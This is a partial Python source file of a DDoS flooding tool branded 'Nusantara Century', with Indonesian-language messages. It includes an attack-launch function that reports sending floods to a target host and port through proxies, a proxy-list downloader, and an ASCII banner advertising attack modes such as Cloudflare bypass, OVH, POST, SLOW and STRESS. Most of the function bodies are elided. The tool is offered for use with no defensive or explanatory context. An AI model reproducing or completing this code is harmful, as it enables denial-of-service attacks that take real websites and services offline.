...
def start_attack(method, threads, event, socks_type):
    ...
    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        ...
        print("{} Nusantara Century Send Attack To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Nusantara Century Send Attack To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
...
def proxydl(out_file, socks_type):
    ...
    print("downloading {}'s proxy tunggu sebentar".format(socktyper))
    ...
    ╚╝─╚═╩══╩══╩╝╚╩╝╚╩═╩╝╚╩╝╚╝╚╝
       ======MⷨAͣDͩEͤ ВⷡY   FAͣнⷩRͬIͥCͨᴛⷮ=====
                        ...
                        ╚═╩═╩╩═╩═╩═╩╝╠╗║
                          ─────────────╚═╝
                {Fore.RESET}╔═════════════════════════════════╗
                {Fore.RESET}║           {Fore.LIGHTCYAN_EX}Nusantara Century                       {Fore.RESET}║
                {Fore.RESET}║ {Fore.LIGHTCYAN_EX}Version : 1.1.1 realise                              {Fore.RESET}║
                {Fore.RESET}╚═════════════════════════════════╝
                       {Fore.RESET}╔═════════════════╗
                     ...
                     {Fore.RESET}║   {Fore.LIGHTCYAN_EX}CFB, BYPASS,GET,OVH   {Fore.RESET} ║     
                     {Fore.RESET}║   {Fore.LIGHTCYAN_EX}STRESS,POST, SLOW,DLL  {Fore.RESET}║     
                     {Fore.RESET}╚════════════════════════════╝
...
if __name__ == '__main__':
    import os, requests, socket, colorama, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
